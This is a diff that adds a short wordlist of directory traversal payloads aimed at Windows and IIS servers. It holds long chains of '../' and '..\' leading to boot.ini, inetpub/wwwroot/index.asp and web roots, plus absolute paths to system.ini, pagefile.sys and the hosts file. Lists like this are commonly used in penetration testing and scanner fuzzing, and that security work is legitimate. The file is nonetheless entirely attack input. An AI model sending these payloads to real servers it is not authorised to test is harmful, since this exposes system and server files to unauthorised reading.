@@ -1,0 +1,23 @@
+# RELATIVE PATHS
+../../../../../../../../../../../../../../../../../boot.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+
+../../../../../../../../../../../../../../../../../
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\
+
+../../../../../../../../../../../../../../../../../inetpub/wwwroot/index.asp
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\inetpub\wwwroot\index.asp
+
+../../../../../../../../../../../../../../../../../inetpub/wwwroot/
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\inetpub\wwwroot\
+
+# ABSOLUTE PATHS
+c:\boot.ini
+c:\
+c:\inetpub\wwwroot\index.asp
+c:\inetpub\
+c:\pagefile.sys
+c:\Windows\system.ini
+c:\Windows\
+c:\Windows\System32\drivers\etc\hosts
+c:\Windows\System32\drivers\etc\
